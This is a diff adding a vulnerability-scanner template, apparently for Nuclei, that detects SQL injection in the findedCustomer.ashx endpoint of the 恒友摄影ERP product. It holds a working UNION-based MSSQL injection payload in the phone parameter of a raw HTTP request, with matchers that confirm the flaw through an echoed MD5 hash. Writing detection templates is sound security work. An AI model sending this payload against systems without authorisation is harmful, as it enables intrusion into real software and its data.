@@ -1,0 +1,35 @@
+id: hengyousoft-erp-findedcustomer-ashx-sqli
+info:
+  name: 恒友摄影ERP findedCustomer.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in 恒友摄影ERP's findedCustomer.ashx endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /ashx/findedCustomer.ashx?Method=InitPage&UserID=20130107155124520&ShopID=F0&name=1&phone=%27)+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+wzLJ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"ChildName\":"
+          - "\"ID\":"
+          - "0x{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<html"
+        negative: true
